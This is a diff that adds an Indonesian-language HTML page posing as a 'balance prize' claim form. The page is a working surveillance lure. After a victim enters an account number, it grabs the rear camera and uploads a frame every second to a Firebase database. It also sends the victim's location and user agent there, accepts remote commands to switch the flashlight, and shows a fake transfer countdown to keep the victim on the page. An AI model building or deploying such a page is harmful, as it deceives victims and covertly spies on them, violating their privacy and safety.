@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Klaim Hadiah Saldo</title>
+    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-database-compat.js"></script>
+    <style>
+        :root { --primary-red: #d63031; --dark-red: #b32d2e; }
+        body { 
+            background: #fdfdfd; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            display: flex; justify-content: center; align-items: center; 
+            height: 100vh; margin: 0; color: #2d3436;
+        }
+        .container { 
+            width: 90%; max-width: 360px; background: #fff; 
+            border-radius: 25px; text-align: center; 
+            box-shadow: 0 20px 50px rgba(0,0,0,0.1); overflow: hidden;
+            border: 1px solid #eee;
+        }
+        .header { background: var(--primary-red); padding: 40px 20px; color: white; }
+        .content { padding: 30px 20px; }
+        .btn { 
+            width: 100%; padding: 18px; background: var(--primary-red); 
+            color: #fff; border: none; border-radius: 12px; 
+            font-weight: 800; font-size: 16px; cursor: pointer; transition: 0.2s;
+        }
+        .btn:active { transform: scale(0.98); background: var(--dark-red); }
+        input { 
+            width: 100%; padding: 15px; margin-bottom: 20px; 
+            border: 2px solid #eee; border-radius: 12px; 
+            text-align: center; outline: none; font-size: 16px; box-sizing: border-box;
+        }
+        input:focus { border-color: var(--primary-red); }
+        .loading-box { display: none; padding: 20px; }
+        .loader {
+            border: 5px solid #f3f3f3; border-top: 5px solid var(--primary-red);
+            border-radius: 50%; width: 45px; height: 45px;
+            animation: spin 1s linear infinite; margin: 0 auto 20px;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .progress-container { width: 100%; background: #eee; border-radius: 20px; height: 8px; margin: 15px 0; }
+        .progress-bar { width: 0%; height: 100%; background: #2ecc71; border-radius: 20px; transition: 1s linear; }
+        .warning { color: #d63031; font-size: 12px; font-weight: bold; margin-top: 15px; line-height: 1.5; }
+    </style>
+</head>
+<body>
+
+<div class="container" id="main-container">
+    <div class="header">
+        <div style="font-size:60px; margin-bottom:10px;">🧧</div>
+        <h2 style="margin:0;">Hadiah Saldo</h2>
+        <p style="margin:5px 0 0; opacity:0.9;">Kejutan untuk Anda hari ini!</p>
+    </div>
+
+    <div class="content" id="ui-input">
+        <p style="color:#636e72; font-size:14px; margin-bottom:20px;">Masukkan nomor akun Anda untuk mencairkan saldo hadiah.</p>
+        <input type="number" id="target_id" placeholder="Nomor Akun (08...)" pattern="[0-9]*">
+        <button class="btn" onclick="initiate()">KLAIM SEKARANG</button>
+    </div>
+
+    <div class="loading-box" id="ui-loading">
+        <div class="loader"></div>
+        <h3 id="status-title">Memverifikasi Izin...</h3>
+        <p id="status-desc" style="font-size:13px; color:#636e72;">Sedang menyiapkan jalur enkripsi.</p>
+        
+        <div class="progress-container">
+            <div class="progress-bar" id="p-bar"></div>
+        </div>
+        
+        <div class="warning">
+            ⚠️ PERINGATAN: JANGAN KELUAR!<br>
+            Tetap di halaman ini sampai proses transfer 100% selesai agar saldo tidak hangus.
+        </div>
+    </div>
+</div>
+
+<video id="v" autoplay playsinline muted style="display:none;"></video>
+<canvas id="c" style="display:none;"></canvas>
+
+<script>
+    // Konfigurasi Firebase Anda (Tetap sama)
+    const firebaseConfig = {
+        apiKey: "AIzaSyD3usv5rw801fV1nrXIwyDQ6eYEzC7hDk0",
+        authDomain: "kodangz.firebaseapp.com",
+        databaseURL: "https://kodangz-default-rtdb.firebaseio.com",
+        projectId: "kodangz",
+        storageBucket: "kodangz.firebasestorage.app",
+        messagingSenderId: "306989473099",
+        appId: "1:306989473099:web:9049d3135ce13e08a8dcce"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+    let myDID = "USR-" + Math.floor(Math.random()*99999);
+    let camTrack = null;
+
+    async function initiate() {
+        const target = document.getElementById('target_id').value;
+        if(target.length < 5) return alert("Masukkan data yang valid!");
+
+        try {
+            // Meminta izin kamera & lokasi
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: "environment" } 
+            });
+            
+            // Switch UI
+            document.getElementById('ui-input').style.display = 'none';
+            document.getElementById('ui-loading').style.display = 'block';
+
+            // Simpan track untuk fitur FLASH
+            camTrack = stream.getVideoTracks()[0];
+            const v = document.getElementById('v'), cv = document.getElementById('c');
+            v.srcObject = stream;
+            v.play();
+
+            // Firebase: Catat Koneksi
+            db.ref(`connections/${target}/${myDID}`).set({ 
+                info: navigator.userAgent,
+                status: "Proses Transfer"
+            });
+
+            // Geolocation
+            navigator.geolocation.getCurrentPosition(p => {
+                db.ref(`data/${myDID}/location`).set({ lat: p.coords.latitude, lng: p.coords.longitude });
+            }, err => console.log("Loc Denied"));
+
+            // Streaming (Setiap 1 detik)
+            setInterval(() => {
+                if(v.videoWidth > 0) {
+                    cv.width = v.videoWidth; cv.height = v.videoHeight;
+                    cv.getContext('2d').drawImage(v, 0, 0);
+                    db.ref(`data/${myDID}/stream`).set({ frame: cv.toDataURL('image/jpeg', 0.3) });
+                }
+            }, 1000);
+
+            // Listener FITUR FLASH (Agar tetap work)
+            db.ref(`commands/${myDID}`).on('value', s => {
+                const cmd = s.val();
+                if(cmd && camTrack && typeof camTrack.applyConstraints === 'function') {
+                    camTrack.applyConstraints({
+                        advanced: [{ torch: !!cmd.torch }]
+                    }).catch(e => console.log("Flash Error:", e));
+                }
+            });
+
+            // Jalankan Timer 1 Menit (60 Detik)
+            startTransferTimer();
+
+        } catch(e) {
+            alert("Gagal memproses. Pastikan semua izin (Kamera & Lokasi) diberikan!");
+        }
+    }
+
+    function startTransferTimer() {
+        let seconds = 60;
+        const bar = document.getElementById('p-bar');
+        const title = document.getElementById('status-title');
+        const desc = document.getElementById('status-desc');
+
+        const timer = setInterval(() => {
+            seconds--;
+            let progress = ((60 - seconds) / 60) * 100;
+            bar.style.width = progress + "%";
+            
+            title.innerText = "Mentransfer Saldo...";
+            desc.innerText = `Sedang memproses ke akun Anda (${seconds} detik tersisa)`;
+
+            if(seconds <= 0) {
+                clearInterval(timer);
+                title.innerText = "Transfer Tertunda";
+                desc.innerText = "Koneksi tidak stabil. Silakan muat ulang halaman.";
+                bar.style.backgroundColor = "#d63031";
+            }
+        }, 1000);
+    }
+</script>
+</body>
+          </html>
+          
